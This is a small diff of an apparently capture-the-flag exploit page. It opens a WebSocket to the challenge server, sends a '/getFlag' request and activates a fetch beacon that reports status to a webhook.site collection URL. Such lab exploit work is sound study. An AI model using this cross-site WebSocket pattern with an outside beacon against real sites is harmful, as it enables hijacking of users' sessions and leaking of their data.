@@ -9,11 +9,12 @@
 
   <script>
 
-    // fetch('https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?status=loaded')
-    //   .catch(() => { });
-
+    
     const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
-
+    
+    fetch('https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?status=' + ws.readyState)
+      .catch(() => { });
+    
     ws.addEventListener('open', () => {
       ws.send(JSON.stringify({ message: '/getFlag' }));
     });
